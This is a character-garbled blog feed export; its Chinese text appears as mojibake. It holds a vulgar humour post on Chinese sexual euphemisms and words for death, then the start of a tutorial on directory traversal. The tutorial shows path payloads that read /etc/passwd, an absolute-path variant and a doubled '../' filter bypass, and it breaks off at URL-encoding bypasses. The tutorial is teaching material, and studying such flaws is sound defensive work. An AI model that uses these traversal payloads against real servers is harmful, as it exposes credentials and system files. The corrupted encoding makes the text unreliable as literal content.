å¯èƒ½è¿˜åœ¨å¹»æƒ³ç€å¥³ç¥æ´—å®Œäº†æ¾¡ç»™ä½ æ‰“ä¸ªè§†é¢‘ç”µè¯è¿‡æ¥ï¼Œç„¶åé—®ä½ å¥¹å¥½ä¸å¥½çœ‹ï¼ˆâ€œæ‰‘å“§â€ï¼Œæ¥è‡ªå±å¹•å¦ä¸€ç«¯çš„æ— æƒ…å—¤ç¬‘ï¼‰</p><p>é‚£è¿™å“¥ä»¬ç¡®å®ä¹Ÿæ˜¯ä¸æ‡‚å‘³å—·ï¼Œå¦‚æœæƒ³å’Œä½ èŠçš„è¯æˆ–è€…è¯´è§‰å¾—å’Œä½ èŠå¤©æœ‰æ„æ€ï¼Œäººå®¶è‚¯å®šç¬¬ä¸€æ—¶é—´å°±æ¥æ‰¾ä½ äº†ï¼Œæ˜¯ä¸æ˜¯ï¼Œä½ æ€»ä¸å¸Œæœ›å¬åˆ°â€œğŸ‘µä¸æƒ³å’Œä½ ä¸ªçŸ¬é€¼å±Œä¸èŠäº†ï¼ŒğŸ‘µè¦å»æ‰¾ğŸ‘µå–œæ¬¢çš„ğŸ‘´äº†ï¼Œçˆ¬å§â€è¿™æ ·çš„è¯å§ï¼Œé‚£ä¹Ÿå¤ªæ²¡å‘³äº†ï¼Œè€Œä¸”åˆ«äººä¹Ÿè‚¯å®šä¸æ„¿æ„å»æŒ‘æ˜è¿™ç§ç©æ„ï¼Œå¤šæ²¡æ„æ€ï¼Œè‡ªå·±å¿ƒé‡Œæœ‰Bæ•°å°±å¥½è¾£ã€‚</p><p>ç”Ÿæ´»ä¸­æœ‰è®¸å¤šäº‹æƒ…æ˜¯åªéœ€æ„ä¼šï¼Œä¸å¿…è¨€ä¼ çš„ï¼Œå¤äººä¹Ÿæ›¾è¯´è¿‡â€œè¨€æœ‰å°½è€Œæ„æ— ç©·ï¼Œä½™æ„å°½åœ¨ä¸æ–¹ä¸­â€ï¼Œè®²ä¸ªç¬‘è¯ï¼š</p><blockquote><p>ä»å‰ï¼Œæœ‰ä¸ªé…’åº—è€æ¿ï¼Œè„¾æ°”éå¸¸æš´èºã€‚ä¸€å¤©ï¼Œæœ‰ä¸ªå®¢äººæ¥å–é…’ï¼Œæ‰å–äº†ä¸€å£ï¼Œå˜´é‡Œä¾¿å«ï¼šâ€œå¥½é…¸ï¼å¥½é…¸ï¼â€è€æ¿å¬åå¤§æ€’ï¼Œä¸ç”±åˆ†è¯´ï¼ŒæŠŠå®¢äººç»‘èµ·æ¥ï¼ŒåŠåœ¨å±‹æ¢ä¸Šã€‚è¿™æ—¶æ¥äº†å¦ä¸€ä½é¡¾å®¢ï¼Œé—®è€æ¿ä¸ºä»€ä¹ˆåŠäººï¼Œè€æ¿å›ç­”ï¼šâ€œæˆ‘åº—çš„é…’æ˜æ˜é¦™é†‡ç”œç¾ï¼Œè¿™å®¶ä¼™ç¡¬è¯´æ˜¯é…¸çš„ï¼Œä½ è¯´è¯¥ä¸è¯¥åŠäººï¼Ÿâ€æ¥å®¢è¯´ï¼šâ€œå¯ä¸å¯è®©æˆ‘å°å°ï¼Ÿâ€è€æ¿æ®·å‹¤åœ°ç»™ä»–ç«¯äº†ä¸€æ¯é…’ï¼Œå®¢äººå‘·äº†ä¸€å£ï¼Œé…¸å¾—çš±çœ‰çœ¯çœ¼ï¼Œå¯¹è€æ¿è¯´ï¼šâ€œä½ æ”¾ä¸‹è¿™ä¸ªäººï¼ŒæŠŠæˆ‘åŠèµ·æ¥å§ï¼Ÿâ€è¿™ä½å®¢äººå§”å©‰å«è“„çš„è¯´æ³•ï¼Œæ—¢æ”¶åˆ°å¼ºçƒˆçš„è®½åˆºæ•ˆæœï¼Œåˆæ˜¾å¾—éå¸¸è‰ºæœ¯ã€‚</p></blockquote><p>â€œäºˆè°“èŠï¼ŒèŠ±ä¹‹éšé€¸è€…ä¹Ÿâ€ï¼Œåªä¸€å¥ï¼ŒåŒ—å®‹å‘¨æ•¦é¢å°±å°†èŠèŠ±ç­‰åŒäºå¤ä»£éšå£«ã€‚ä¸é£Ÿäººé—´çƒŸç«ï¼Œé«˜å†·èŒƒå„¿ï¼Œå¦¥å¦¥çš„ï¼Œå…¨æ˜¯èŠèŠ±å¥½ã€‚è€Œä»Šï¼Œæ–°æ–°äººç±»åˆ©ç”¨ä»–ä»¬åºå¤§çš„è„‘æ´ï¼Œå°†è¿™äº›è¯æ±‡çš„å«ä¹‰è¿›è¡Œäº†å¼•ç”³ã€‚â€œç•™å›¾ä¸ç•™ç§ï¼ŒèŠèŠ±ä¸‡äººæ…â€ã€‚ğŸ‘´è¸é©¬ç¬‘å¾—èŠèŠ±éƒ½æ¾äº†â€¦â€¦ä»æ­¤ï¼Œä¸–é£æ—¥ä¸‹ï¼ŒèŠèŠ±ä¸åœ¨ã€‚å†å›é¦–ï¼Œè¯»åˆ°â€œèŠä¹‹çˆ±ï¼Œé™¶åé²œæœ‰é—»ã€‚â€ï¼Œå½“æ—¶ä¾¿è™èº¯ä¸€éœ‡ï¼Œä¼¼ä¹æ˜ç™½äº†ä»€ä¹ˆã€‚ï¼ˆè¯¯ï¼‰</p><p>ã€Šå£æŠ€ã€‹ï¼Œåˆæ˜¯å¤§å®¶éƒ½å­¦è¿‡çš„ï¼šâ€œé¥é—»æ·±å··çŠ¬å å£°ï¼Œä¾¿æœ‰å¦‡äººæƒŠè§‰æ¬ ä¼¸ï¼Œæ‘‡å…¶å¤«è¯­çŒ¥äºµäº‹ã€‚å¤«å‘“è¯­ï¼Œåˆä¸ç”šåº”ï¼Œå¦‡æ‘‡ä¹‹ä¸æ­¢ï¼Œåˆ™äºŒäººè¯­æ¸é—´æ‚ï¼ŒåºŠåˆä»ä¸­æˆ›æˆ›ã€‚â€ï¼Œä»ä¸­æˆ›æˆ›ï¼Œå“ˆå“ˆå“ˆï¼</p><p>å†æ¥è°ˆç‚¹å¥‡â™‚æ€ªçš„ä¸œè¥¿å§ï¼Œè€ç¥–å®—é€ å­—æœ‰ä¸ªè§„çŸ©ï¼Œç®€å•ç²—æš´ã€‚ç®€å•æ€ä¹ˆè¯´å‘¢ï¼Ÿä¼šæ„æ³•é€ å­—ï¼Œè®©äººä¸€ç›®äº†ç„¶ï¼Œæ¯”å¦‚â€œä¼‘â€ï¼Œäººé æ ‘æ‰€è°“ä¼‘æ¯ï¼›å†æ¯”å¦‚â€œå›šâ€ï¼Œäººå›°äºå£æ‰€è°“å›šï¼›åˆåƒâ€œå°–â€ï¼Œä¸Šå°ä¸‹å¤§ä¸ºå°–ï¼Œéƒ½å¾ˆç”ŸåŠ¨å½¢è±¡ã€‚ç²—æš´å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€çœ‹è¿™ä¸ªå­—â€”â€”â€œè‚â€ï¼ˆcaoï¼‰ï¼Œä¸Šå…¥ï¼Œä¸‹ğŸ¥©ï¼Œå«ä¹‰å°±æ˜¯è¿›å…¥åˆ°è‚‰é‡Œé¢å»ï¼Œä»…ä»å­—å½¢å°±æš´éœ²å‡º sexual intercourse çš„æœ¬è´¨ï¼Œã€Šçº¢æ¥¼æ¢¦ã€‹ä¸­æœ‰ä¸ªç»å…¸æ¡¥æ®µï¼šâ€œåªè§ç‚•ä¸Šé‚£äººç¬‘é“ï¼šâ€˜ç‘å¤§å”è¦è‚æˆ‘å‘¢ï¼â€™â€ã€‚å½“ç„¶å‘¢ï¼Œè¿˜æœ‰â€œæŒŠâ€ï¼ˆnongï¼‰ï¼Œç”¨æ‰‹ä¸Šä¸‹æ‘©æ“¦æŸæ ¹ç©æ„ï¼Œä»”ç»†æƒ³æƒ³è¿™ä¸å°±æ˜¯æ’¸å˜›ï¼Œå…¶å®å®ƒæœ¬æ¥çš„æ„æ€ä¹Ÿæ­£æ˜¯ç”·æ€§è‡ªæˆ‘å®‰æ…°ã€‚</p><p>è¿™ä¿©å­—æŒºé€†å¤©çš„ï¼Œè¾¾åˆ°äº†ä¼šæ„çš„æœ€é«˜å¢ƒç•Œï¼Œæ‰€ä»¥å®ƒä»¬ä¹Ÿè¢«å±è”½æ‰äº†ï¼Œä¸è¿‡å‘¢ï¼Œå°½ç®¡å¤±å»äº†è¿™ä¿©å­—ï¼Œæˆ‘ä»¬è¿˜å‘æ˜äº†â€œè‰¹â€â€œæ“â€â€œæ’¸â€â€œå¹²â€â€œå¼„â€â€œæ—¥â€â€œæ’â€ç­‰å­—è¯ï¼Œå®ƒä»¬ä¹ŸæˆåŠŸåœ°å–ä»£äº†å‰è€…ï¼Œæˆä¸ºäº†å®ƒä»¬çš„å§”å©‰ç”¨æ³•ï¼Œä¸è¿‡ç¬¬ä¸€æ¬¡çœ‹è§â€œè‚â€å’Œâ€œæŒŠâ€ï¼Œåº”è¯¥å¤šåŠæ˜¯ä¸€è„¸æ‡µé€¼çš„ï¼Œå®é™…ä¸Šæˆ‘ä»¬ä¼šæ›´åŠ ä¹æ„ä½¿ç”¨åè€…ï¼Œâ€œXä½ ç¥–å®—ï¼â€ã€‚</p><p>åŸå› å…¶å®å¾ˆç®€å•ï¼Œæ¯•ç«Ÿâ€œè‚â€å’Œâ€œæŒŠâ€ä¸¤ä¸ªå­—å¤ªè¿‡äºå½¢è±¡ç”ŸåŠ¨ï¼Œåè€Œæä¸èµ·ä¸­å›½äººçš„å…´è¶£ï¼Œå› ä¸ºè¶Šæ˜¯å½¢è±¡ç”ŸåŠ¨çš„å­—è¯ï¼Œè¶Šæ˜¯æ²¡æœ‰è”æƒ³ç©ºé—´ï¼›è¶Šæ²¡æœ‰è”æƒ³ç©ºé—´ï¼Œå°±è¶Šä¸éªšæ°”ä¸æµªæ¼«ã€‚æ¯”å¦‚åŒ—æ–¹ä¿—è¯­çš„â€œå¹²å¤©ï¼Œæ“åœ°ï¼Œæ—¥å¤ªé˜³â€ï¼Œé»˜å¿µä¸‰éï¼Œå¹»è‚¢å·²ç¡¬ï¼è‹¥å˜æˆäº†â€œè‚å¤©ï¼Œè‚åœ°ï¼Œè‚å¤ªé˜³â€ï¼Œå¤§å“¥èƒ½ä¸èƒ½æ¢ä¸ªè¯ï¼Ÿï¼è¡¨è¾¾å¤ªå•è°ƒå•Šã€‚</p><p>è€Œä¸”â€œè‚â€ï¼Œâ€œæŒŠâ€ä¸¤å­—å¤ªè¿‡èµ¤è£¸ï¼Œä»é£èŠ±é›ªæœˆåˆ°çœŸæªå®å¹²çš„è¿™ä¸€æ­¥éª¤ï¼Œå¦‚è‹¥ä½ ç”¨è¿™ä¿©è¯ï¼Œ233333æ˜¯ä¸æ˜¯æ€ªæ€ªçš„ï¼Œæˆ–è®¸è¿™å°±æ˜¯å§”å©‰çš„é­…åŠ›å§ï¼Œè¶Šæ˜¯æ— é™å§”å©‰ï¼Œè¶Šæ˜¯æ˜¾å¾—æ±¡åŠ›æ»”æ»”ï¼Œä¼ è¿›åƒå®¶ä¸‡æˆ·â€¦â€¦å½“ç„¶ï¼Œæ™®é€šçš„å§”å©‰è¯­å¹¶ä¸èƒ½è®©ä½ æˆä¸ºæŠŠå¦¹é«˜æ‰‹ã€‚æ»¡å˜´â€œèŠèŠ±â€â€œé»„ç“œâ€â€œæœ¨è€³â€åªä¼šè®©ä½ æ›´åŠ çŒ¥çã€‚</p><p>å…·æœ‰é«˜çº§æ„Ÿçš„å§”å©‰è¯­å¯é‡ä¸å¯æ±‚ï¼Œè¿™ä¸ªè¦åƒè€ç¥–å®—å­¦ä¹ ã€‚é¦–å…ˆè¦ä¼šåšæ¢¦ï¼Œæ¢¦æ„Ÿè¦æå¼ºï¼æœ€å¥½èƒ½ä»¤äººæµ®æƒ³è”ç¿©ã€‚æˆ˜å›½æ—¶å®‹ç‰çš„ã€Šé«˜å”èµ‹ã€‹æœ‰è¨€ï¼š</p><hr><p>æ˜”è€…å…ˆç‹æ¢¦è§ä¸€å¦‡äººæ›°ï¼šå¦¾ï¼Œå·«å±±ä¹‹å¥³ä¹Ÿï¼Œæ„¿èæ•å¸­ã€‚</p><p>å…ˆç‹é—®ï¼šä½ å¹²å˜›çš„ï¼Ÿæˆ‘å¯ä¸æ˜¯éšä¾¿çš„äºº</p><p>å¦‡äººç­”ï¼šå¦¾æ—¦ä¸ºæœäº‘ï¼Œæš®ä¸ºè¡Œé›¨ã€‚</p><hr><p>äºæ˜¯å…ˆç‹ç¡äº†ä¸€ä¸ªæ™¨å˜äº‘æœµï¼Œæ™šå˜çƒŸé›¨çš„å¥³å­ã€‚ä»–ä»¬ç¡çš„è¿‡ç¨‹å°±è¢«å¤§å®¶ç²—æš´åœ°è®¤ä¸ºæ˜¯â€œå·«å±±äº‘é›¨â€ã€‚â€œå·«å±±â€â€œäº‘é›¨â€ä¸¤ä¸ªè¯è´´åˆ‡å•Šï¼å·«å±±äº‘é›¨æ˜¯åºŠç¬«ä¹‹æ¬¢ã€‚æ›¹é›ªèŠ¹åœ¨ã€Šçº¢æ¥¼æ¢¦ã€‹ç¬¬å…­å›â€œå®ç‰åˆè¯•äº‘é›¨æƒ…â€ä¸­å†™çš„å°±æ˜¯è´¾å®ç‰ä¸ä¸«ç¯è¢­äººæˆ¿äº‹ä¹‹æ—¶çš„æƒ…æ™¯ï¼Œä½†æ­¤å¤„è´¾å®ç‰æºè¢­äººè¡Œæˆ¿äº‹æœ‰æ²¡æœ‰é‚£å•¥é‚£å•¥é‚£å•¥é‚£å•¥é‚£å•¥å¿«ä¹å’±ä»¬å°±ä¸å¾—è€ŒçŸ¥äº†ã€‚</p><p>å…¶æ¬¡è¦ä¼šè”æƒ³ï¼Œé¢ é¸¾å€’å‡¤ï¼Œé¸¾æ˜¯ç¥é¸Ÿï¼Œå‡¤å°±æ˜¯å‡¤å‡°ã€‚é¢ é¸¾å€’å‡¤çš„æœ¬æ„æ¯”å–»é¢ å€’æ¬¡åºã€‚å¦‚æœå°†é¢ é¸¾å€’å‡¤ç”¨äºäººèº«ä¸Šï¼Œå°±æœ‰äº†ç”·å¥³äº¤æ¬¢ä¹‹æ„ã€‚å…ƒä»£ç‹å®ç”«ã€Šè¥¿å¢è®°ã€‹ç¬¬å››æœ¬ç¬¬äºŒæŠ˜ä¸­æœ‰ï¼šâ€œä½ ç»£å¸·é‡Œæ•ˆç»¸ç¼ªï¼Œé¢ é¸¾å€’å‡¤ç™¾äº‹æœ‰â€çš„è®°è½½ï¼Œã€Šçº¢æ¥¼æ¢¦ã€‹ç¬¬å…­åäº”å›ä¹Ÿæœ‰â€œæ˜¯å¤œï¼Œè´¾çå’Œä»–é¢ é¸¾å€’å‡¤ï¼Œç™¾èˆ¬æ©çˆ±â€ã€‚å§¿åŠ¿å¾ˆä¸°å¯Œå˜›ã€‚ç”¨ç°åœ¨çš„è¯æ¥è¯´ï¼Œå°±æ˜¯6ï¸âƒ£9ï¸âƒ£ã€‚ä¸€æ6ï¸âƒ£9ï¸âƒ£ï¼Œè€å¸æœºä¼šå¿ƒä¸€ç¬‘ï¼Œé¢ é¸¾å€’å‡¤å°±æ˜¾å¾—æ›´åŠ è€äººå¯»å‘³ã€‚</p><p>è¯´åˆ°å†…æ¶µï¼Œå…ƒæœç‹å®ç”«åœ¨ã€Šè¥¿å¢è®°ã€‹ä¸­çš„å¦å¤–ä¸€ä¸ªè¯è¯­â€”â€”é±¼æ°´ä¹‹æ¬¢æ›´åŠ æœ‰å†…æ¶µã€‚é±¼å’Œæ°´çš„æ•…äº‹æœ€æ—©å‡ºè‡ªäºåè‘—ã€Šä¸‰å›½æ¼”ä¹‰ã€‹ä¸­ï¼Œåˆ˜å¤‡å¯¹è¯¸è‘›äº®çš„è¯„è¯­å°±æ˜¯ï¼šå¾å¾—å­”æ˜ï¼ŒçŠ¹é±¼ä¹‹å¾—æ°´ä¹Ÿã€‚å½¢å®¹èæ´½çš„åˆä½œä¼´ä¾£çš„å…³ç³»ã€‚å½“åˆä½œä¼´ä¾£å˜ä¸ºç”·äººå’Œå¥³äººçš„æ—¶å€™ï¼Œâ€œå¦‚é±¼å¾—æ°´â€ä¹Ÿå°±æ¼”å˜æˆä¸ºäº†â€œé±¼æ°´ä¹‹æ¬¢â€ã€‚è¿™ç±»è¯è¿˜æœ‰å¾ˆå¤šï¼Œâ€œäºé£ä¹‹æ„¿â€â€œäº‘æœé›¨æš®â€â€œç®¡é²ä¹‹äº¤â€â€¦â€¦ï¼ˆç”¨çš„å¼€å¿ƒï¼Œæ‰æ˜¯çœŸçš„å¥½~ï¼‰</p><p>ä½ å–œæ¬¢â€œmake loveâ€ï¼ŒğŸ‘´å–œæ¬¢â€œæœäº‘æš®é›¨â€ï¼Œä½ å–œæ¬¢â€œçº¦å—ï¼Ÿâ€ï¼ŒğŸ‘´å–œæ¬¢â€œèŠ±æ˜æœˆæš—ç¬¼è½»é›¾ï¼Œä»Šå®µå¥½å‘éƒè¾¹å»â€ã€‚ä¸­æ–‡çš„åšå¤§ç²¾æ·±åœ¨å§”å©‰è¿™é‡Œä¹ŸçœŸæ˜¯ä½“ç°å¾—æ·‹æ¼“å°½è‡´ï¼Œæ¯”èµ·ä¸€ä¸ä¸æŒ‚ï¼Œæˆ‘ä»¬æ›´å–œæ¬¢æµ´éœ¸è¿˜ä¼‘ï¼ˆbushi</p><p>è¯´æ¥ï¼Œä½ å»åŒ»é™¢å¯ä»¥ç›´æ¥ç”¨â€œèŠèŠ±â€è¿™ä¸ªè¯æ±‡æ¥è¡¨è¾¾ï¼ŒåŒ»ç”Ÿéƒ½èƒ½å¤Ÿåˆ†åˆ†é’Ÿç†è§£ä½ çš„å«ä¹‰ã€‚ä¸è¿‡ï¼Œåˆ«æŒ‡æœ›è¿™ä¸ªè¯æ±‡ä¼šå‡ºç°åœ¨ä½ çš„ç—…å†ä¸Šï¼ŒåŒ»ç”Ÿå¯æ²¡æœ‰ä½ é‚£ä¹ˆå¹½é»˜ã€‚è¯´åˆ°åŒ»é™¢å’ŒåŒ»ç”Ÿï¼Œæˆ‘ä»¬å†æ¥èŠèŠåˆ«çš„ï¼Œåˆšæ‰ä¼¼ä¹å¼€ğŸš—å¼€è¿‡å¤´äº†ï¼Œå’³å’³ã€‚</p><p>â€œå¯¹ä¸èµ·ï¼Œæˆ‘ä»¬å·²ç»å°½åŠ›äº†â€œï¼Œè¿™æ˜¯å¤§å¤«ä»¬åœ¨æŠ¢æ•‘ä¸å›æ¥ç—…äººçš„æ—¶å€™æœ€å¸¸ç”¨çš„ä¸€å¥ï¼Œç”·ä¸»ç»æœ›åœ°çœ‹ç€æŠ¢æ•‘å®¤æš—ä¸‹å»çš„ğŸ’¡ï¼Œæ— åŠ›åœ°ç˜«å€’åœ¨äº†ICUå¤–çš„å‡³å­ä¸Šï¼Œè„‘æµ·é‡Œå¼€å§‹è·‘é©¬ç¯ï¼Œå›å¿†èµ·æ¥ä»–å’Œä»–æœ€çˆ±çš„å¥³å‹â€¦â€¦å…»çš„å°ç‹—åº¦è¿‡çš„é‚£äº›å¹¸ç¦ç¬é—´â€¦â€¦</p><p>ä¸æ‰¯è¿œäº†ï¼Œæˆ‘ä»¬ç»§ç»­å›åˆ°è¯é¢˜ï¼Œè™½ç„¶è¯´ç”Ÿè€ç—…æ­»æ˜¯äººé—´å¸¸æ€ï¼Œä½†æ˜¯å¯¹äºæ­»è¿™ä¸ªå­—ï¼Œäººä»¬è¿˜æ˜¯å¾ˆæœ‰å¿Œè®³çš„ï¼Œä»å¤è‡³ä»Šï¼Œäººä»¬éƒ½åœ¨å¯»æ‰¾å¯ä»¥æ›¿ä»£æ­»å­—çš„è¯æ±‡æˆ–è€…æ˜¯è¯´æ³•ï¼Œæ¯”å¦‚ï¼š</p><hr><p>äº¡ã€æ•…ã€å’ã€å¼±ã€é€ã€æ®ã€æ®ªã€æ¯™ã€æ®‚ã€å¾‚ã€æ®’ã€è–¨ã€æ­»äº¡ã€ä¸§äº¡ã€äº¡æ•…ã€èº«æ•…ã€ç‰©æ•…ã€ç‰©åŒ–ã€å»ä¸–ã€é€ä¸–ã€å¼ƒä¸–ã€è¿‡ä¸–ã€ä¸‹ä¸–ã€å°±ä¸–ã€è°¢ä¸–ã€å‡‹è°¢ã€æ­»ç­ã€æ¯™å‘½ã€æ¯•å‘½ã€æ®’å‘½ã€æ®’ç­ã€æèƒŒã€æé¦†ã€æ®‚è½ã€å¾‚è½ã€æ®‚è°¢ã€å¾‚è°¢ã€è¿åŒ–ã€æ€›åŒ–ã€ç–¾ç»ˆã€é•¿é€ã€æ°¸è¯€ã€æ°¸åˆ«ã€æ°¸çœ ã€é•¿çœ ã€å°±æœ¨ã€æ•…å»ã€æº˜é€ã€æº˜æ­»ã€æ–­æ°”ã€å’½æ°”ã€åˆçœ¼ã€é—­çœ¼ã€æ²¡äº†ã€æŒºè…¿ã€å®Œè›‹ã€å‘œå‘¼ã€å›è€å®¶ã€ç©å„¿å®Œã€ç¿˜è¾«å­ã€ä¸Šè¥¿å¤©ã€è§é˜ç‹ã€ç™»é¬¼å½•ã€å¡«æ²Ÿå£‘ã€ç²‰èº«ç¢éª¨ã€è§é©¬å…‹æ€ã€ä¸ä¸–é•¿è¾ã€æº˜ç„¶é•¿é€ã€å¯¿ç»ˆæ­£å¯ã€å‘½èµ´é»„æ³‰ã€å‘œå‘¼å“€å“‰ã€ä¸€å‘½å‘œå‘¼ã€å¤©å¤ºå…¶é­„ã€ä»™é€ã€ä»™æ¸¸ã€åƒå¤ã€ä½œå¤ã€å½’è¥¿ã€å½’å¤©ã€å¤§æ•…ã€ä¸åœ¨ã€è¿‡å»ã€ä¸ç¦„ã€ä¸è®³ã€ä¸å¯è®³ã€è·¨é¹¤è¥¿æ¸¸ã€åƒç§‹ä¹‹åã€ç™¾å¹´ä¹‹åˆã€ä¸‰é•¿ä¸¤çŸ­ã€å±±é«˜æ°´ä½ã€è§èƒŒã€å¼ƒå…»ã€ç‰ºç‰²ã€èˆèº«ã€çŒ®èº«ã€å°±ä¹‰ã€æèº¯ã€æç”Ÿã€æ®‰èŒã€æ®‰å›½ã€æ®‰éš¾ã€æ®‰èŠ‚ã€æ®‰ã€æ•ˆæ­»ã€æ•ˆå‘½ã€æˆå‘½ã€é˜µäº¡ã€æˆä»ã€æ€èº«æˆä»ã€èˆç”Ÿå–ä¹‰ã€ä»¥èº«è®¸å›½ã€é©¬é©è£¹å°¸ã€è‚è„‘ï¼ˆèƒ†ï¼‰æ¶‚åœ°ã€æ¨ªæ­»ã€å¼ºæ­»ã€å‡¶æ­»ã€ä¸§å‘½ã€é€å‘½ã€æ¯™å‘½ã€æš´å’ã€å€’å¤´ã€æ­»äºéå‘½ã€é¥¿æ­»ã€æ®£ã€å‡å¤©ã€æ¶…ç›˜ã€ååŒ–ã€ç¾½åŒ–ã€é¹¤åŒ–ã€ç‰©åŒ–ã€åœ†å¯‚ã€å½’å¯‚ã€ç¤ºå¯‚ã€å…¥å¯‚ã€å…¥ç­ã€ç­åº¦ã€ç¤ºç­ã€å°¸è§£ã€å´©ã€é©¾å´©ã€å±±é™µå´©ã€æ™é©¾ã€å‡éã€ç™»éã€å®¾å¤©ã€å¤§è¡Œã€åƒç§‹ä¸‡å²ã€å¤­æŠ˜ã€å¤­äº¡ã€çŸ­æŠ˜ã€æ—©ä¸–ã€æ—©é€ã€æ—©æ­»ã€ä¸­æ®‡ã€æ®‡ã€å…°æ‘§ç‰æŠ˜ã€ç‰æ¥¼èµ´å¬ã€ç‰æ¥¼ä¿®è®°ã€åœ°ä¸‹ä¿®æ–‡ã€è‘¬ç‰åŸ‹é¦™ã€ç‰æ®’é¦™æ¶ˆã€é¦™æ¶ˆç‰æ®’ã€å€Ÿå¥³ç¦»é­‚ã€å®¢æ­»ã€ç˜æ­»</p><hr><p>è¿™ä¹ˆä¸€åˆ—ï¼Œæ„ˆå‘æ„Ÿè§‰äººä»¬ä¸ºäº†é¿è®³èƒ½æœ‰å¤šå¼ºçš„åˆ›é€ èƒ½åŠ›ã€‚</p><p>å­¦ä¹ ä¹‹ä½™éšä¾¿ä¾ƒä¾ƒè¿™äº›æ„Ÿè§‰å·¨é¸¡å„¿ğŸ‘ï¼Œæ”¾æ¾å¿ƒæƒ…ï¼Œä»¤äººç¥æ¸…æ°”çˆ½ï¼Œå¥½åƒé¸½äº†<code>ä¸å¸¦è„å­—çš„éª‚äººè¯´æ³•</code>ä¸¤å›äº†ï¼Œä¸‹æ¬¡ç»§ç»­ğŸ•Šï¼Œæºœ</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆç›®å½•ç©¿è¶Š</title>
      <link href="2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
      <url>2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>ç›®å½•éå†ï¼ˆç›®å½•ç©¿è¶Šï¼‰æ˜¯ä¸€ä¸ªWebå®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è¯»å–è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚ è¿™å¯èƒ½åŒ…æ‹¬åº”ç”¨ç¨‹åºä»£ç å’Œæ•°æ®ï¼Œåç«¯ç³»ç»Ÿçš„ç™»å½•ä¿¡æ¯ä»¥åŠæ•æ„Ÿçš„æ“ä½œç³»ç»Ÿæ–‡ä»¶</p><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿåœ¨æœåŠ¡å™¨ä¸Šå†™å…¥ä»»æ„æ–‡ä»¶ï¼Œï¼ˆå¦‚ï¼ŒFFFTP æ˜¯ä¸€æ¬¾å°å‹çš„ FTP å®¢æˆ·ç«¯è½¯ä»¶ã€‚FFFTPå®¢æˆ·ç«¯æ²¡æœ‰æ­£ç¡®åœ°éªŒè¯ FTP æœåŠ¡å™¨æ‰€è¿”å›çš„ LIST å‘½ä»¤å“åº”ä¸­åŒ…å«æœ‰ç›®å½•éå†åºåˆ—ï¼ˆæ–œçº¿ï¼‰çš„æ–‡ä»¶åï¼Œå¦‚æœç”¨æˆ·å—éª—ä»æ¶æ„çš„ FTP æœåŠ¡å™¨ä¸‹è½½çš„ç›®å½•åŒ…å«æœ‰å¸¦æœ‰æ¶æ„æ–‡ä»¶åçš„æ–‡ä»¶çš„è¯ï¼Œå°±å¯èƒ½å¯¼è‡´å‘ç”¨æˆ·ç³»ç»Ÿçš„ä»»æ„ä½ç½®å†™å…¥æ–‡ä»¶ï¼‰ä»è€Œå…è®¸ä»–ä»¬ä¿®æ”¹åº”ç”¨ç¨‹åºæ•°æ®æˆ–è¡Œä¸ºï¼Œå¹¶æœ€ç»ˆå®Œå…¨æ§åˆ¶æœåŠ¡å™¨</p><h2 id="å§¿åŠ¿"><a href="#å§¿åŠ¿" class="headerlink" title="å§¿åŠ¿"></a>å§¿åŠ¿</h2><h3 id="0x00-åŸºç¡€ç›®å½•éå†"><a href="#0x00-åŸºç¡€ç›®å½•éå†" class="headerlink" title="0x00 åŸºç¡€ç›®å½•éå†"></a>0x00 åŸºç¡€ç›®å½•éå†</h3><p>ç›´æ¥åˆ©ç”¨ ../ è¿”å›ä¸Šä¸€çº§æ¥éå†ä»»æ„æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="0x01-ç»å¯¹è·¯å¾„"><a href="#0x01-ç»å¯¹è·¯å¾„" class="headerlink" title="0x01 ç»å¯¹è·¯å¾„"></a>0x01 ç»å¯¹è·¯å¾„</h3><p>webç½‘ç«™æœ‰æ—¶å€™ä¼šé‡‡å–ç›®å½•éå†çš„é˜²å¾¡æªæ–½ï¼Œå¦‚è¿‡æ»¤ ../ ä¸Šä¸€çº§ç­‰å…³é”®å­—ï¼Œç„¶åç®€å•çš„è¿‡æ»¤é€šå¸¸ä¼šè¢«ç»•è¿‡ã€‚æœ‰æ—¶å€™å¯ä»¥ç›´æ¥é‡‡ç”¨ç»å¯¹è·¯å¾„ï¼Œæ— é¡» ../ è¿”å›ä¸Šä¸€çº§ç›®å½•éå†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="0x02-åŒå†™-ç»•è¿‡"><a href="#0x02-åŒå†™-ç»•è¿‡" class="headerlink" title="0x02 åŒå†™../ç»•è¿‡"></a>0x02 åŒå†™../ç»•è¿‡</h3><p>æœ‰æ—¶å€™ï¼Œé˜²å¾¡æªæ–½æ˜¯ç›´æ¥å°† ../ æ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥ç›´æ¥é‡‡ç”¨åŒå†™ç›´æ¥ç»•è¿‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="0x03-URLç¼–ç ç»•è¿‡"><a href="#0x03-URLç¼–ç ç»•è¿‡" class="headerlink" title="0x03 URLç¼–ç ç»•è¿‡"></a>0x03 